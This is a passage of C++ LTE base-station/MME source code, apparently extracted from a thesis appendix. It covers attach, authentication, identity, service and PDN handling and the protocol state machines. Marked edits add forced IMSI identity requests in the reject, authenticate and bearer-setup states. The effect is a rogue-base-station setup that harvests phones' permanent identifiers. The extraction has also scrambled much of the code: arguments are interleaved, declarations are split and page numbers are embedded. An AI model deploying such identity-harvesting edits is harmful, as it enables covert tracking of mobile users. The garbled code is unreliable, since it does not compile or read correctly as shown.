+
+for(i=0; i<15; i++)
+{
+
+imei_num *= 10;
+imei_num += attach_req.eps_mobile_id.imei[i];
+
+}
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"IMEI=%015llu is associated with RNTI=%u, RB=%s",
+imei_num,
+(*user)->get_c_rnti(),
+LTE_fdd_enb_rb_text[(*rb)->get_rb_id()]);
+
+if(hss->is_imei_allowed(imei_num))
+{
+
+if((*user)->get_eea_support(0) && (*user)->get_eia_support(2))
+{
+
+(*rb)->set_mme_state(LTE_FDD_ENB_MME_STATE_AUTHENTICATE);
+(*user)->set_id(hss->get_user_id_from_imei(imei_num));
+
+}else{
+
+(*user)->set_emm_cause(
+
+LIBLTE_MME_EMM_CAUSE_UE_SECURITY_CAPABILITIES_MISMATCH);
+
+(*rb)->set_mme_state(LTE_FDD_ENB_MME_STATE_REJECT);
+
+}
+
+}else{
+
+(*user)->set_temp_id(imei_num);
+(*rb)->set_mme_state(LTE_FDD_ENB_MME_STATE_REJECT);
+
+}
+
+}
+
+}
+void LTE_fdd_enb_mme::parse_authentication_failure(LIBLTE_BYTE_MSG_STRUCT *msg,
+
+LTE_fdd_enb_user
+LTE_fdd_enb_rb
+
+*user,
+*rb)
+
+{
+
+LTE_fdd_enb_hss
+LIBLTE_MME_AUTHENTICATION_FAILURE_MSG_STRUCT auth_fail;
+
+*hss
+
+= LTE_fdd_enb_hss::get_instance();
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Received Authentication Failure for RNTI=%u and RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Unpack the message
+liblte_mme_unpack_authentication_failure_msg(msg, &auth_fail);
+
+if(LIBLTE_MME_EMM_CAUSE_SYNCH_FAILURE == auth_fail.emm_cause &&
+
+60
+
+auth_fail.auth_fail_param_present)
+
+{
+
+sem_wait(&sys_info_sem);
+hss->security_resynch(user->get_id(), sys_info.mcc, sys_info.mnc, auth_fail.
+
+auth_fail_param);
+
+sem_post(&sys_info_sem);
+
+}else{
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Authentication failure cause=%02X, RNTI=%u, RB=%s",
+auth_fail.emm_cause,
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_RELEASE);
+
+}
+
+}
+void LTE_fdd_enb_mme::parse_authentication_response(LIBLTE_BYTE_MSG_STRUCT *msg,
+
+LTE_fdd_enb_user
+LTE_fdd_enb_rb
+
+*user,
+*rb)
+
+{
+
+LTE_fdd_enb_hss
+LTE_FDD_ENB_AUTHENTICATION_VECTOR_STRUCT *auth_vec = NULL;
+LIBLTE_MME_AUTHENTICATION_RESPONSE_MSG_STRUCT auth_resp;
+uint32
+bool
+
+i;
+res_match = true;
+
+*hss
+
+= LTE_fdd_enb_hss::get_instance();
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Received Authentication Response for RNTI=%u and RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Unpack the message
+liblte_mme_unpack_authentication_response_msg(msg, &auth_resp);
+
+// Check RES
+auth_vec = hss->get_auth_vec(user->get_id());
+if(NULL != auth_vec)
+{
+
+res_match = true;
+for(i=0; i<8; i++)
+{
+
+if(auth_vec->res[i] != auth_resp.res[i])
+{
+
+res_match = false;
+break;
+
+}
+
+61
+
+}
+
+if(res_match)
+{
+
+interface->send_ctrl_info_msg("user authentication successful imsi=%s imei=%s
+
+",
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+user->get_imsi_str().c_str(),
+user->get_imei_str().c_str());
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Authentication successful for RNTI=%u and RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+user->set_auth_vec(auth_vec);
+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_ENABLE_SECURITY);
+
+}else{
+
+interface->send_ctrl_info_msg("user authentication rejected (RES MISMATCH)
+
+imsi=%s imei=%s",
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+user->get_imsi_str().c_str(),
+user->get_imei_str().c_str());
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Authentication rejected (RES MISMATCH) for RNTI=%u and
+
+RB=%s",
+
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_AUTH_REJECTED);
+
+}
+
+}else{
+
+interface->send_ctrl_info_msg("user authentication rejected (NO AUTH VEC) imsi=%s
+
+imei=%s",
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+user->get_imsi_str().c_str(),
+user->get_imei_str().c_str());
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Authentication rejected (NO AUTH VEC) for RNTI=%u and RB
+
+=%s",
+
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_AUTH_REJECTED);
+
+}
+
+}
+void LTE_fdd_enb_mme::parse_detach_request(LIBLTE_BYTE_MSG_STRUCT *msg,
+
+LTE_fdd_enb_user
+LTE_fdd_enb_rb
+
+*user,
+*rb)
+
+62
+
+{
+
+LTE_fdd_enb_user_mgr
+LIBLTE_MME_DETACH_REQUEST_MSG_STRUCT detach_req;
+
+*user_mgr = LTE_fdd_enb_user_mgr::get_instance();
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Received Detach Request for RNTI=%u and RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Unpack the message
+liblte_mme_unpack_detach_request_msg(msg, &detach_req);
+
+// Set the procedure
+rb->set_mme_procedure(LTE_FDD_ENB_MME_PROC_DETACH);
+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_SEND_DETACH_ACCEPT);
+
+// Delete the user
+user->prepare_for_deletion();
+
+}
+void LTE_fdd_enb_mme::parse_identity_response(LIBLTE_BYTE_MSG_STRUCT *msg,
+
+LTE_fdd_enb_user
+LTE_fdd_enb_rb
+
+*user,
+*rb)
+
+{
+
+LTE_fdd_enb_hss
+LIBLTE_MME_ID_RESPONSE_MSG_STRUCT id_resp;
+uint64
+uint64
+uint32
+
+imsi_num = 0;
+imei_num = 0;
+i;
+
+*hss
+
+= LTE_fdd_enb_hss::get_instance();
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Received Identity Response for RNTI=%u and RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Unpack the message
+liblte_mme_unpack_identity_response_msg(msg, &id_resp);
+
+// Store the ID
+if(LIBLTE_MME_MOBILE_ID_TYPE_IMSI == id_resp.mobile_id.type_of_id)
+{
+
+for(i=0; i<15; i++)
+{
+
+imsi_num *= 10;
+imsi_num += id_resp.mobile_id.imsi[i];
+
+}
+
+63
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"IMSI=%015llu is associated with RNTI=%u, RB=%s",
+imsi_num,
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+if(hss->is_imsi_allowed(imsi_num))
+{
+
+if(user->get_eea_support(0) && user->get_eia_support(2))
+{
+
+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_AUTHENTICATE);
+user->set_id(hss->get_user_id_from_imsi(imsi_num));
+
+}else{
+
+user->set_emm_cause(LIBLTE_MME_EMM_CAUSE_UE_SECURITY_CAPABILITIES_MISMATCH)
+
+;
+
+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_REJECT);
+
+}
+
+}else{
+
+user->set_temp_id(imsi_num);
+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_REJECT);
+
+}
+
+}else if(LIBLTE_MME_MOBILE_ID_TYPE_IMEI == id_resp.mobile_id.type_of_id){
+
+for(i=0; i<15; i++)
+{
+
+imei_num *= 10;
+imei_num += id_resp.mobile_id.imei[i];
+
+}
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"IMEI=%015llu is associated with RNTI=%u, RB=%s",
+imei_num,
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+if(hss->is_imei_allowed(imei_num))
+{
+
+if(user->get_eea_support(0) && user->get_eia_support(2))
+{
+
+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_AUTHENTICATE);
+user->set_id(hss->get_user_id_from_imei(imei_num));
+
+}else{
+
+user->set_emm_cause(LIBLTE_MME_EMM_CAUSE_UE_SECURITY_CAPABILITIES_MISMATCH)
+
+;
+
+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_REJECT);
+
+}
+
+}else{
+
+user->set_temp_id(imei_num);
+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_REJECT);
+
+64
+
+}
+
+}else{
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Invalid ID_TYPE=%u",
+id_resp.mobile_id.type_of_id);
+
+}
+
+}
+void LTE_fdd_enb_mme::parse_security_mode_complete(LIBLTE_BYTE_MSG_STRUCT *msg,
+
+LTE_fdd_enb_user
+LTE_fdd_enb_rb
+
+*user,
+*rb)
+
+{
+
+LIBLTE_MME_SECURITY_MODE_COMPLETE_MSG_STRUCT sec_mode_comp;
+uint64
+uint32
+
+imei_num = 0;
+i;
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Received Security Mode Complete for RNTI=%u and RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Unpack the message
+liblte_mme_unpack_security_mode_complete_msg(msg, &sec_mode_comp);
+
+if(sec_mode_comp.imeisv_present)
+{
+
+if(LIBLTE_MME_MOBILE_ID_TYPE_IMEISV == sec_mode_comp.imeisv.type_of_id)
+{
+
+for(i=0; i<14; i++)
+{
+
+imei_num *= 10;
+imei_num += sec_mode_comp.imeisv.imeisv[i];
+
+}
+if((user->get_id()->imei/10) != imei_num)
+{
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Received IMEI (%015llu) does not match stored IMEI
+
+(%015llu), RNTI=%u, RB=%s",
+
+imei_num*10,
+(user->get_id()->imei/10)*10,
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+}
+
+65
+
+}else{
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Security Mode Complete received with invalid ID type
+
+(%u), RNTI=%u, RB=%s",
+
+sec_mode_comp.imeisv.type_of_id,
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+}
+
+}
+
+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_RRC_SECURITY);
+
+}
+void LTE_fdd_enb_mme::parse_security_mode_reject(LIBLTE_BYTE_MSG_STRUCT *msg,
+
+LTE_fdd_enb_user
+LTE_fdd_enb_rb
+
+*user,
+*rb)
+
+{
+
+LIBLTE_MME_SECURITY_MODE_REJECT_MSG_STRUCT sec_mode_rej;
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Received Security Mode Reject for RNTI=%u and RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Unpack the message
+liblte_mme_unpack_security_mode_reject_msg(msg, &sec_mode_rej);
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Security Mode Rejected cause=%02X, RNTI=%u, RB=%s",
+sec_mode_rej.emm_cause,
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_RELEASE);
+
+}
+void LTE_fdd_enb_mme::parse_service_request(LIBLTE_BYTE_MSG_STRUCT *msg,
+
+LTE_fdd_enb_user
+LTE_fdd_enb_rb
+
+*user,
+*rb)
+
+{
+
+LTE_fdd_enb_hss
+LTE_FDD_ENB_AUTHENTICATION_VECTOR_STRUCT *auth_vec = user->get_auth_vec();
+LTE_FDD_ENB_AUTHENTICATION_VECTOR_STRUCT *hss_auth_vec;
+LTE_FDD_ENB_RRC_CMD_READY_MSG_STRUCT cmd_ready;
+LIBLTE_MME_SERVICE_REQUEST_MSG_STRUCT service_req;
+
+*hss
+
+= LTE_fdd_enb_hss::get_instance();
+
+66
+
+uint32
+
+i;
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Received Service Request for RNTI=%u, RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Unpack the message
+liblte_mme_unpack_service_request_msg(msg, &service_req);
+
+// Set the procedure
+rb->set_mme_procedure(LTE_FDD_ENB_MME_PROC_SERVICE_REQUEST);
+
+// Verify KSI and sequence number
+if(0 != service_req.ksi_and_seq_num.ksi)
+{
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Invalid KSI (%u) for RNTI=%u, RB=%s",
+service_req.ksi_and_seq_num.ksi,
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+send_service_reject(user, rb, LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
+
+// Set the state
+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_RELEASE);
+
+}else{
+
+if(auth_vec->nas_count_ul != service_req.ksi_and_seq_num.seq_num)
+{
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Sequence number mismatch (rx=%u, stored=%u) for RNTI=%
+
+u, RB=%s",
+
+service_req.ksi_and_seq_num.seq_num,
+user->get_auth_vec()->nas_count_ul,
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Resolve sequence number mismatch
+auth_vec->nas_count_ul = service_req.ksi_and_seq_num.seq_num;
+hss_auth_vec
+
+= hss->regenerate_enb_security_data(user->get_id(),
+
+auth_vec->nas_count_ul);
+
+if(NULL != hss_auth_vec)
+
+67
+
+{
+
+}
+
+}
+
+for(i=0; i<32; i++)
+{
+
+auth_vec->k_rrc_enc[i] = hss_auth_vec->k_rrc_enc[i];
+auth_vec->k_rrc_int[i] = hss_auth_vec->k_rrc_int[i];
+
+}
+
+// Set the state
+if(NULL != hss_auth_vec)
+{
+
+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_RRC_SECURITY);
+
+}else{
+
+send_service_reject(user, rb, LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_RELEASE);
+
+}
+
+}
+
+}
+void LTE_fdd_enb_mme::parse_activate_default_eps_bearer_context_accept(
+
+LIBLTE_BYTE_MSG_STRUCT *msg,
+
+{
+
+LIBLTE_MME_ACTIVATE_DEFAULT_EPS_BEARER_CONTEXT_ACCEPT_MSG_STRUCT
+
+act_def_eps_bearer_context_accept;
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_fdd_enb_user
+
+*
+
+user,
+
+LTE_fdd_enb_rb
+
+*rb)
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Received Activate Default EPS Bearer Context Accept for RNTI
+
+=%u and RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Unpack the message
+liblte_mme_unpack_activate_default_eps_bearer_context_accept_msg(msg, &
+
+act_def_eps_bearer_context_accept);
+
+interface->send_ctrl_info_msg("default bearer setup for imsi=%s imei=%s",
+
+user->get_imsi_str().c_str(),
+user->get_imei_str().c_str());
+
+}
+void LTE_fdd_enb_mme::parse_esm_information_response(LIBLTE_BYTE_MSG_STRUCT *msg,
+
+LTE_fdd_enb_user
+LTE_fdd_enb_rb
+
+*user,
+*rb)
+
+{
+
+LIBLTE_MME_ESM_INFORMATION_RESPONSE_MSG_STRUCT esm_info_resp;
+
+68
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Received ESM Information Response for RNTI=%u and RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Unpack the message
+liblte_mme_unpack_esm_information_response_msg(msg, &esm_info_resp);
+
+// FIXME
+
+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_ATTACH_ACCEPT);
+
+}
+void LTE_fdd_enb_mme::parse_pdn_connectivity_request(LIBLTE_BYTE_MSG_STRUCT *msg,
+
+LTE_fdd_enb_user
+LTE_fdd_enb_rb
+
+*user,
+*rb)
+
+{
+
+//
+//
+//
+//
+//
+
+//
+
+LIBLTE_MME_PDN_CONNECTIVITY_REQUEST_MSG_STRUCT pdn_con_req;
+LIBLTE_MME_PROTOCOL_CONFIG_OPTIONS_STRUCT pco_resp;
+uint32
+
+i;
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Received PDN Connectivity Request for RNTI=%u and RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Unpack the message
+liblte_mme_unpack_pdn_connectivity_request_msg(msg, &pdn_con_req);
+
+// Store the EPS Bearer ID
+user->set_eps_bearer_id(pdn_con_req.eps_bearer_id);
+
+// Store the Procedure Transaction ID
+user->set_proc_transaction_id(pdn_con_req.proc_transaction_id);
+
+// Store the PDN Type
+user->set_pdn_type(pdn_con_req.pdn_type);
+
+// Store the ESM Information Transfer Flag
+
+if(pdn_con_req.esm_info_transfer_flag_present &&
+
+LIBLTE_MME_ESM_INFO_TRANSFER_FLAG_REQUIRED == pdn_con_req.esm_info_transfer_flag)
+
+{
+
+user->set_esm_info_transfer(true);
+
+}else{
+
+user->set_esm_info_transfer(false);
+
+}
+
+69
+
+if(pdn_con_req.protocol_cnfg_opts_present)
+{
+
+pco_resp.N_opts = 0;
+for(i=0; i<pdn_con_req.protocol_cnfg_opts.N_opts; i++)
+{
+
+if(LIBLTE_MME_CONFIGURATION_PROTOCOL_OPTIONS_IPCP == pdn_con_req.
+
+protocol_cnfg_opts.opt[i].id)
+
+{
+
+if(0x01 == pdn_con_req.protocol_cnfg_opts.opt[i].contents[0] &&
+0x81 == pdn_con_req.protocol_cnfg_opts.opt[i].contents[4] &&
+0x83 == pdn_con_req.protocol_cnfg_opts.opt[i].contents[10])
+
+{
+
+pco_resp.opt[pco_resp.N_opts].id
+
+=
+
+LIBLTE_MME_CONFIGURATION_PROTOCOL_OPTIONS_IPCP;
+
+pco_resp.opt[pco_resp.N_opts].len
+pco_resp.opt[pco_resp.N_opts].contents[0] = 0x03;
+pco_resp.opt[pco_resp.N_opts].contents[1] = pdn_con_req.
+
+= 16;
+
+protocol_cnfg_opts.opt[i].contents[1];
+
+pco_resp.opt[pco_resp.N_opts].contents[2] = 0x00;
+pco_resp.opt[pco_resp.N_opts].contents[3] = 0x10;
+pco_resp.opt[pco_resp.N_opts].contents[4] = 0x81;
+pco_resp.opt[pco_resp.N_opts].contents[5] = 0x06;
+pco_resp.opt[pco_resp.N_opts].contents[6] = (dns_addr >> 24) & 0xFF;
+pco_resp.opt[pco_resp.N_opts].contents[7] = (dns_addr >> 16) & 0xFF;
+pco_resp.opt[pco_resp.N_opts].contents[8] = (dns_addr >> 8) & 0xFF;
+pco_resp.opt[pco_resp.N_opts].contents[9] = dns_addr & 0xFF;
+pco_resp.opt[pco_resp.N_opts].contents[10] = 0x83;
+pco_resp.opt[pco_resp.N_opts].contents[11] = 0x06;
+pco_resp.opt[pco_resp.N_opts].contents[12] = (dns_addr >> 24) & 0xFF;
+pco_resp.opt[pco_resp.N_opts].contents[13] = (dns_addr >> 16) & 0xFF;
+pco_resp.opt[pco_resp.N_opts].contents[14] = (dns_addr >> 8) & 0xFF;
+pco_resp.opt[pco_resp.N_opts].contents[15] = dns_addr & 0xFF;
+pco_resp.N_opts++;
+
+}else{
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Unknown PCO");
+
+}
+
+}else if(LIBLTE_MME_ADDITIONAL_PARAMETERS_UL_DNS_SERVER_IPV4_ADDRESS_REQUEST
+
+== pdn_con_req.protocol_cnfg_opts.opt[i].id){
+pco_resp.opt[pco_resp.N_opts].id
+
+=
+
+LIBLTE_MME_ADDITIONAL_PARAMETERS_DL_DNS_SERVER_IPV4_ADDRESS;
+
+pco_resp.opt[pco_resp.N_opts].len
+pco_resp.opt[pco_resp.N_opts].contents[0] = (dns_addr >> 24) & 0xFF;
+pco_resp.opt[pco_resp.N_opts].contents[1] = (dns_addr >> 16) & 0xFF;
+pco_resp.opt[pco_resp.N_opts].contents[2] = (dns_addr >> 8) & 0xFF;
+pco_resp.opt[pco_resp.N_opts].contents[3] = dns_addr & 0xFF;
+pco_resp.N_opts++;
+
+= 4;
+
+70
+
+}else if(
+
+LIBLTE_MME_ADDITIONAL_PARAMETERS_UL_IP_ADDRESS_ALLOCATION_VIA_NAS_SIGNALLING
+
+== pdn_con_req.protocol_cnfg_opts.opt[i].id){
+
+// Nothing to do
+
+}else{
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"Invalid PCO ID (%04X)",
+pdn_con_req.protocol_cnfg_opts.opt[i].id);
+
+}
+
+}
+user->set_protocol_cnfg_opts(&pco_resp);
+
+}
+
+}
+
+State Machines
+
+/************************/
+/*
+/************************/
+void LTE_fdd_enb_mme::attach_sm(LTE_fdd_enb_user *user,
+
+*/
+
+{
+
+LTE_fdd_enb_rb *rb)
+
+LTE_fdd_enb_hss
+LTE_fdd_enb_user_mgr *user_mgr = LTE_fdd_enb_user_mgr::get_instance();
+
+= LTE_fdd_enb_hss::get_instance();
+
+*hss
+
+switch(rb->get_mme_state())
+{
+case LTE_FDD_ENB_MME_STATE_ID_REQUEST_IMSI:
+
+send_identity_request(user, rb, LIBLTE_MME_ID_TYPE_2_IMSI);
+break;
+
+case LTE_FDD_ENB_MME_STATE_REJECT:
+
+//** Edited by N. Giamblanco
+
+send_identity_request(user, rb, LIBLTE_MME_ID_TYPE_2_IMSI);
+
+//** End of Edit
+
+user->prepare_for_deletion();
+send_attach_reject(user, rb);
+break;
+
+case LTE_FDD_ENB_MME_STATE_AUTHENTICATE:
+
+//** Edited by N. Giamblanco
+
+send_identity_request(user, rb, LIBLTE_MME_ID_TYPE_2_IMSI);
+
+//** End of Edit
+
+send_authentication_request(user, rb);
+break;
+
+case LTE_FDD_ENB_MME_STATE_AUTH_REJECTED:
+send_authentication_reject(user, rb);
+break;
+
+case LTE_FDD_ENB_MME_STATE_ENABLE_SECURITY:
+
+send_security_mode_command(user, rb);
+break;
+
+case LTE_FDD_ENB_MME_STATE_RELEASE:
+
+71
+
+send_rrc_command(user, rb, LTE_FDD_ENB_RRC_CMD_RELEASE);
+break;
+
+case LTE_FDD_ENB_MME_STATE_RRC_SECURITY:
+
+send_rrc_command(user, rb, LTE_FDD_ENB_RRC_CMD_SECURITY);
+break;
+
+case LTE_FDD_ENB_MME_STATE_ESM_INFO_TRANSFER:
+
+send_esm_information_request(user, rb);
+break;
+
+case LTE_FDD_ENB_MME_STATE_ATTACH_ACCEPT:
+
+send_attach_accept(user, rb);
+break;
+
+case LTE_FDD_ENB_MME_STATE_ATTACHED:
+
+send_emm_information(user, rb);
+break;
+
+default:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"ATTACH state machine invalid state %s, RNTI=%u and RB=%s
+
+",
+
+LTE_fdd_enb_mme_state_text[rb->get_mme_state()],
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+break;
+
+}
+
+}
+void LTE_fdd_enb_mme::service_req_sm(LTE_fdd_enb_user *user,
+
+LTE_fdd_enb_rb *rb)
+
+{
+
+switch(rb->get_mme_state())
+{
+case LTE_FDD_ENB_MME_STATE_RELEASE:
+
+send_rrc_command(user, rb, LTE_FDD_ENB_RRC_CMD_RELEASE);
+break;
+
+case LTE_FDD_ENB_MME_STATE_RRC_SECURITY:
+
+send_rrc_command(user, rb, LTE_FDD_ENB_RRC_CMD_SECURITY);
+break;
+
+case LTE_FDD_ENB_MME_STATE_SETUP_DRB:
+
+//** Edited by N. Giamblanco
+
+send_identity_request(user, rb, LIBLTE_MME_ID_TYPE_2_IMSI);
+
+//** End of Edit
+
+send_activate_dedicated_eps_bearer_context_request(user, rb);
+break;
+
+default:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"SERVICE REQUEST state machine invalid state %s, RNTI=%u
+
+and RB=%s",
+
+72
+
+LTE_fdd_enb_mme_state_text[rb->get_mme_state()],
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+break;
+
+}
+
+}
+void LTE_fdd_enb_mme::detach_sm(LTE_fdd_enb_user *user,
+
+LTE_fdd_enb_rb *rb)
+
+{
+
+switch(rb->get_mme_state())
+{
+case LTE_FDD_ENB_MME_STATE_SEND_DETACH_ACCEPT:
+
+send_detach_accept(user, rb);
+break;
+
+default:
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_ERROR,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+"DETACH state machine invalid state %s, RNTI=%u and RB=%s
+
+",
+
+LTE_fdd_enb_mme_state_text[rb->get_mme_state()],
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+break;
+
+}
+
+}
+
+Message Senders
+
+/*************************/
+/*
+/*************************/
+void LTE_fdd_enb_mme::send_attach_accept(LTE_fdd_enb_user *user,
+
+*/
+
+{
+
+LTE_fdd_enb_user_mgr
+
+LTE_fdd_enb_rb *rb)
+
+*user_mgr =
+
+LTE_fdd_enb_user_mgr::get_instance();
+
+LTE_FDD_ENB_RRC_CMD_READY_MSG_STRUCT
+LIBLTE_MME_ATTACH_ACCEPT_MSG_STRUCT
+LIBLTE_MME_ACTIVATE_DEFAULT_EPS_BEARER_CONTEXT_REQUEST_MSG_STRUCT
+
+cmd_ready;
+attach_accept;
+
+act_def_eps_bearer_context_req;
+
+LIBLTE_MME_PROTOCOL_CONFIG_OPTIONS_STRUCT
+
+*pco = user->
+
+get_protocol_cnfg_opts();
+
+LIBLTE_BYTE_MSG_STRUCT
+uint32
+
+// Assign IP address to user
+user->set_ip_addr(get_next_ip_addr());
+ip_addr = user->get_ip_addr();
+
+if(0 == user->get_eps_bearer_id())
+{
+
+73
+
+msg;
+ip_addr;
+
+act_def_eps_bearer_context_req.eps_bearer_id = 5;
+user->set_eps_bearer_id(5);
+
+}else{
+
+act_def_eps_bearer_context_req.eps_bearer_id = user->get_eps_bearer_id();
+
+}
+if(0 == user->get_proc_transaction_id())
+{
+
+act_def_eps_bearer_context_req.proc_transaction_id = 1;
+user->set_proc_transaction_id(1);
+
+}else{
+
+act_def_eps_bearer_context_req.proc_transaction_id = user->get_proc_transaction_id
+
+();
+
